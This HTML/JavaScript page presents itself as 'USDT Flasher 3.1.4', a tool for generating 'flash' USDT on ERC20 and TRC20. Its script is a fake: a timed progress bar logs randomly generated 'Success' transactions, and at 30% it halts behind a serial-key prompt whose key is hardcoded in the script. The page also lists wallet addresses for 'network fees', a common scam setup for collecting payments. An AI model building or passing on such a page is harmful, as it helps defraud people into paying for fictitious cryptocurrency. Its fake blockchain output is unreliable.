<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <link rel="manifest" href="manifest.json">
  <link rel="icon" type="image/png" href="assets/icon-192x192.png">
  <meta name="theme-color" content="#000000">
  <style>
    /* Optional: Dein CSS hier */
  </style>
  <script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/service-worker.js')
        .then(() => console.log("Service Worker registriert."))
        .catch(err => console.error("Service Worker Fehler:", err));
    }
  </script>
</head>
<body>
  <h1></h1>
  <!-- Dein Inhalt -->
</body>
</html>

<body class="flex items-center justify-center min-h-screen">
    <div class="container bg-gray-800 p-8 rounded-lg shadow-lg w-full">
        <h1 class="text-3xl font-bold mb-6 text-center text-blue-400">USDT Flasher 3.1.4</h1>
        <form id="flasherForm" class="grid grid-cols-2 gap-4">
            <div class="mb-4">
                <label for="cryptoCurrency" class="block input-label font-bold mb-2">Network</label>
                <select id="cryptoCurrency" class="block select-field w-full py-3 px-4 rounded leading-tight focus:outline-none">
                    <option value="">Select</option>
                    <option>ERC20</option>
                    <option>TRC20</option>
                </select>
            </div>
            <div class="mb-4">
                <label for="parentAddress" class="block input-label font-bold mb-2">Public Key</label>
                <input type="text" id="parentAddress" class="input-field w-full py-2 px-3 rounded leading-tight focus:outline-none" placeholder="Enter Public Key" minlength="50" required="">
                <p id="parentAddressError" class="error-message hidden">Public Key must be at least 52 characters long.</p>
            </div>
            <div class="mb-4">
                <label for="receiversAddress" class="block input-label font-bold mb-2">Receiver Address</label>
                <input type="text" id="receiversAddress" class="input-field w-full py-2 px-3 rounded leading-tight focus:outline-none" placeholder="Enter Receiver Address" minlength="30" required="">
                <p id="receiversAddressError" class="error-message hidden">Receiver Address must be at least 30 characters long.</p>
            </div>
            <div class="mb-4">
                <label for="amount" class="block input-label font-bold mb-2">Amount</label>
                <select id="amount" class="block select-field w-full py-3 px-4 rounded leading-tight focus:outline-none">
                    <option value="">Select</option>
                    <option>1000</option>
                    <option>5000</option>
                    <option>10000</option>
                    <option>100000</option>
                </select>
            </div>
            <div class="mb-4">
                <label for="durability" class="block input-label font-bold mb-2">Durability</label>
                <select id="durability" class="block select-field w-full py-3 px-4 rounded leading-tight focus:outline-none">
                    <option value="">Select</option>
                    <option>45</option>
                    <option>90</option>
                    <option>no expiry</option>
                </select>
            </div>
            <div class="mb-4">
                <label class="block input-label font-bold mb-2">Proxy Settings</label>
                <div class="flex items-center mb-2">
                    <input type="radio" id="noProxy" name="proxy" value="noProxy" class="mr-2">
                    <label for="noProxy" class="input-label">Don't use proxy</label>
                </div>
                <div class="flex items-center">
                    <input type="radio" id="defaultProxy" name="proxy" value="defaultProxy" class="mr-2">
                    <label for="defaultProxy" class="input-label">Detect default proxy</label>
                </div>
            </div>
            <div class="mb-4">
                <label class="block input-label font-bold mb-2">Transferability</label>
                <div class="flex items-center mb-2">
                    <input type="radio" id="transferable" name="transferability" value="transferable" class="mr-2">
                    <label for="transferable" class="input-label">Transferable</label>
                </div>
                <div class="flex items-center">
                    <input type="radio" id="notTransferable" name="transferability" value="notTransferable" class="mr-2">
                    <label for="notTransferable" class="input-label">Not Transferable</label>
                </div>
            </div>
            <div class="mb-4">
                <label class="block input-label font-bold mb-2">Options</label>
                <div class="flex items-center mb-2">
                    <input type="checkbox" id="split" name="options" value="split" class="mr-2">
                    <label for="split" class="input-label">Split</label>
                </div>
                <div class="flex items-center mb-2">
                    <input type="checkbox" id="trade" name="options" value="trade" class="mr-2">
                    <label for="trade" class="input-label">Trade</label>
                </div>
                <div class="flex items-center">
                    <input type="checkbox" id="swap" name="options" value="swap" class="mr-2">
                    <label for="swap" class="input-label">Swap</label>
                </div>
            </div>
            <div class="col-span-2 mb-4">
                <label class="block input-label font-bold mb-2">Network Fees</label>
                <div class="bg-gray-700 p-4 rounded-lg text-xs">
                    <p>TRX: TY9y7wcBb2ij7goPKEDqRAm3N2jzbChHHN</p>
                    <p>ETH: 0x00000000219ab540356cbb839cbe05303d7705fa</p>
                </div>
            </div>
            <div class="col-span-2 mb-6">
                <button type="button" class="button w-full py-2 px-4 rounded focus:outline-none" onclick="startLoading()">Start Process</button>
            </div>
            <div class="col-span-2 mb-4">
                <div id="loadingBar" class="w-full bg-gray-600 rounded-full h-4">
                    <div id="loadingProgress" class="bg-blue-500 h-4 rounded-full" style="width: 0%;"></div>
                </div>
            </div>
            <div id="statusMessage" class="col-span-2 text-center font-bold"></div>
            <div id="protocol" class="col-span-2 text-xs mt-4 h-64 overflow-y-auto bg-gray-700 p-4 rounded-lg"></div>
        </form>
    </div>

    <div id="serialKeyModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-75 hidden">
        <div class="bg-gray-800 p-8 rounded-lg shadow-lg w-1/3">
            <h2 class="text-xl font-bold mb-4 text-center text-blue-400">Enter Serial Key</h2>
            <div class="flex justify-center mb-4">
                <input type="text" id="serialKeyPart1" class="input-field serial-input" maxlength="4" oninput="moveToNext(this, 'serialKeyPart2')">
                <input type="text" id="serialKeyPart2" class="input-field serial-input" maxlength="4" oninput="moveToNext(this, 'serialKeyPart3')" onkeydown="moveToPrevious(event, 'serialKeyPart1')">
                <input type="text" id="serialKeyPart3" class="input-field serial-input" maxlength="4" oninput="moveToNext(this, 'serialKeyPart4')" onkeydown="moveToPrevious(event, 'serialKeyPart2')">
                <input type="text" id="serialKeyPart4" class="input-field serial-input" maxlength="4" onkeydown="moveToPrevious(event, 'serialKeyPart3')">
            </div>
            <button type="button" class="button w-full py-2 px-4 rounded focus:outline-none" onclick="validateSerialKey()">Submit</button>
            <p id="serialKeyError" class="error-message hidden mt-4 text-center">Invalid Serial Key. Please try again.</p>
        </div>
    </div>

    <script>
        let progress = 0;
        let interval;
        let paused = false;

        function startLoading() {
            if (!validateForm()) {
                return;
            }

            progress = 0;
            const loadingBar = document.getElementById('loadingProgress');
            const statusMessage = document.getElementById('statusMessage');
            const protocol = document.getElementById('protocol');
            statusMessage.textContent = '';
            protocol.innerHTML = '';
            interval = setInterval(() => {
                if (progress >= 100) {
                    clearInterval(interval);
                    statusMessage.textContent = 'SUCCESSFUL FLASH CONTRACT';
                    statusMessage.classList.add('text-green-500');
                    protocol.innerHTML += '<p>Process completed successfully.</p>';
                    loadingBar.style.width = '100%';
                } else {
                    progress += 1;
                    loadingBar.style.width = progress + '%';
                    if (progress === 30 && !paused) {
                        clearInterval(interval);
                        document.getElementById('serialKeyModal').classList.remove('hidden');
                        paused = true;
                    } else {
                        logProtocolStep(progress, protocol);
                    }
                    protocol.scrollTop = protocol.scrollHeight;
                }
            }, 1800); // 3 minutes = 180 seconds, 1800ms per step for 100 steps
        }

        function continueLoading() {
            const loadingBar = document.getElementById('loadingProgress');
            interval = setInterval(() => {
                if (progress >= 100) {
                    clearInterval(interval);
                    statusMessage.textContent = 'SUCCESSFUL FLASH CONTRACT';
                    statusMessage.classList.add('text-green-500');
                    protocol.innerHTML += '<p>Process completed successfully.</p>';
                    loadingBar.style.width = '100%';
                } else {
                    progress += 1;
                    loadingBar.style.width = progress + '%';
                    logProtocolStep(progress, protocol);
                    protocol.scrollTop = protocol.scrollHeight;
                }
            }, 1800);
        }

        function logProtocolStep(progress, protocol) {
            if (progress % 3 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Transferring USDT from ERC20 Wallet Address: 0x${Math.random().toString(36).substring(2, 15)} to TRC20 Wallet Address: T${Math.random().toString(36).substring(2, 15)} - Success</p>`;
            } else if (progress % 5 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Creating smart contract on Blockchain Address: 0x${Math.random().toString(36).substring(2, 15)} - Success</p>`;
            } else if (progress % 7 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Swapping USDT between ERC20 and TRC20 networks - Success</p>`;
            } else if (progress % 11 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Flashing USDT on ERC20 network - Success</p>`;
            } else if (progress % 13 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Flashing USDT on TRC20 network - Success</p>`;
            } else if (progress % 17 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: Validating transaction on Blockchain Address: 0x${Math.random().toString(36).substring(2, 15)} - Success</p>`;
            } else if (progress % 19 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: TRX Network Fees Address: TY9y7wcBb2ij7goPKEDqRAm3N2jzbChHHN - Success</p>`;
            } else if (progress % 23 === 0) {
                protocol.innerHTML += `<p>Step ${progress}: ETH Network Fees Address: 0x00000000219ab540356cbb839cbe05303d7705fa - Success</p>`;
            } else {
                protocol.innerHTML += `<p>Step ${progress}: Executing transaction... Wallet Address: 0x${Math.random().toString(36).substring(2, 15)}, Contract Address: 0x${Math.random().toString(36).substring(2, 15)} - Success</p>`;
            }
        }

        function validateSerialKey() {
            const part1 = document.getElementById('serialKeyPart1').value.trim();
            const part2 = document.getElementById('serialKeyPart2').value.trim();
            const part3 = document.getElementById('serialKeyPart3').value.trim();
            const part4 = document.getElementById('serialKeyPart4').value.trim();
            const serialKey = part1 + part2 + part3 + part4;
            const serialKeyError = document.getElementById('serialKeyError');

            if (serialKey === '7533583294383843') {
                serialKeyError.classList.add('hidden');
                document.getElementById('serialKeyModal').classList.add('hidden');
                paused = false;
                continueLoading(); // Prozess fortsetzen
            } else {
                serialKeyError.classList.remove('hidden'); // Fehlermeldung anzeigen
            }
        }

        function moveToNext(current, nextFieldID) {
            if (current.value.length >= 4) {
                document.getElementById(nextFieldID).focus();
            }
        }

        function moveToPrevious(event, previousFieldID) {
            if (event.key === 'Backspace' && event.target.value.length === 0) {
                document.getElementById(previousFieldID).focus();
            }
        }

        function validateForm() {
            const cryptoCurrency = document.getElementById('cryptoCurrency').value;
            const parentAddress = document.getElementById('parentAddress').value;
            const receiversAddress = document.getElementById('receiversAddress').value;
            const amount = document.getElementById('amount').value;
            const durability = document.getElementById('durability').value;
            const proxy = document.querySelector('input[name="proxy"]:checked');
            const transferability = document.querySelector('input[name="transferability"]:checked');

            let isValid = true;

            if (parentAddress.length < 50) {
                document.getElementById('parentAddressError').classList.remove('hidden');
                isValid = false;
            } else {
                document.getElementById('parentAddressError').classList.add('hidden');
            }

            if (receiversAddress.length < 30) {
                document.getElementById('receiversAddressError').classList.remove('hidden');
                isValid = false;
            } else {
                document.getElementById('receiversAddressError').classList.add('hidden');
            }

            return isValid && cryptoCurrency && parentAddress && receiversAddress && amount && durability && proxy && transferability;
        }
    </script>

</body></html>
